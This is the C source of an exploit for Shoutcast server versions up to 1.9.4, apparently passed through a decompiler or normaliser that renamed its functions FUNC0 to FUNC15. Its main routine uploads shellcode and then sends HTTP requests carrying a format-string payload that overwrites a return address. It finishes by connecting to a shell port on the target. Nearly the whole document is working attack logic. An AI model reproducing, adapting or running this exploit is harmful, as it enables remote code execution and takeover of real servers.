#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct sockaddr_in {int dummy; } ;
typedef  int /*<<< orphan*/  buffer ;
struct TYPE_2__ {char* platform; int retaddr; int dpa_offset; scalar_t__ retloc; } ;

/* Variables and functions */
 int SHELL_PORT ; 
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int FUNC2 (struct sockaddr_in,int) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ) ; 
 int FUNC5 (struct sockaddr_in,int,int) ; 
 int FUNC6 (struct sockaddr_in,int) ; 
 int FUNC7 (int,char**,char*) ; 
 int /*<<< orphan*/  FUNC8 (char*,int,int) ; 
 char* optarg ; 
 int /*<<< orphan*/  FUNC9 (char*,...) ; 
 int /*<<< orphan*/  FUNC10 (struct sockaddr_in*,char*) ; 
 int /*<<< orphan*/  FUNC11 (char*,int,char*,unsigned short,int,unsigned short,int) ; 
 int /*<<< orphan*/  FUNC12 (int,char*,char*) ; 
 int /*<<< orphan*/  stdout ; 
 TYPE_1__* targets ; 
 int /*<<< orphan*/  FUNC13 (char*) ; 
 int FUNC14 (struct sockaddr_in,int,int,int) ; 

int FUNC15(int argc, char **argv){
    char *hostn = NULL, buffer[1024];
    int i, sock, opt, target = 0, port = 8000, shell_port = SHELL_PORT, sleeps = 1, wsleeps = 7;
    unsigned short ret1, ret2;
	struct sockaddr_in addr;

    FUNC9("[!] Shoutcast <= 1.9.4 exploit by crash-x\n");
  
    if (argc < 2)
        FUNC13(argv[0]);
    
    while ((opt = FUNC7 (argc, argv, "h:p:t:s:S:")) != -1){
        switch (opt){
	        case 'h':
	            hostn = optarg;
	            break;
	        case 'p':
                port = FUNC0(optarg);
                if(port > 65535 || port < 1){
                    FUNC9("[-] Port %d is invalid\n",port);
                    return 1;
                }
                break;
            case 't':
                target = FUNC0(optarg);
                for(i = 0; targets[i].platform; i++);
                if(target >= i){
                    FUNC9("[-] Wtf are you trying to target?\n");
                    FUNC13(argv[0]);
                }
                break;
            case 's': 
                sleeps = FUNC0(optarg);
                break;
            case 'S': 
                wsleeps = FUNC0(optarg);
                break;
        	default:
                FUNC13(argv[0]);
        }
    }

    if(hostn == NULL)
        FUNC13(argv[0]);

    FUNC10(&addr, hostn);

    FUNC9("[!] Connecting to target... ");
    FUNC4(stdout);
    if(target == 0){
        if((target = FUNC6(addr, port)) < 0)
            return target;
    } else 
        if(FUNC6(addr, port) == -2)
            FUNC3(-2);

    FUNC9("[!] Targeting: %s\n", targets[target].platform);
    

    if(FUNC14(addr, port, target, wsleeps) != -1)
        FUNC9("[+]\n[+] Uploaded shellcode succesful\n");
    else {
        FUNC9("[-]\n[-] Wasn't able to upload shellcode, server probably crashed!\n");
        return -1;
    }

    FUNC9("[!] Writing retaddr [%p] to retloc [%p]\n", (void *)targets[target].retaddr, (void *)targets[target].retloc);


    if((sock = FUNC2(addr, port)) == -1){
        FUNC9("[-] Connecting failed!\n");
        return -1;
    }
    FUNC8(buffer, 0x0, sizeof(buffer));
    *((void **)(buffer)) = (void *)(targets[target].retloc);
    *((void **)(buffer + 4)) = (void *)(targets[target].retloc + 2);
    FUNC12(sock, "GET /content/DD%s.mp3 HTTP/1.1\r\n\r\n", buffer);
    FUNC1(sock);

    ret1 = (targets[target].retaddr & 0xffff0000) >> 16;
    ret2 = (targets[target].retaddr & 0x0000ffff);

    FUNC11(buffer, sizeof(buffer), "%%.%uu%%%d$hn%%.%uu%%%d$hn", 
            ret1, targets[target].dpa_offset + 1, (ret2 - ret1), targets[target].dpa_offset);

    if((sock = FUNC2(addr, port)) == -1){
        FUNC9("[-] Connecting failed!\n");
        return -1;
    }
    FUNC12(sock, "GET /content/%s.mp3 HTTP/1.1\r\n\r\n", buffer);

    if(FUNC5(addr, shell_port, sleeps) == -1){
        FUNC9("[-] Exploit failed\n");
        return -1;
    }
    return 1;
}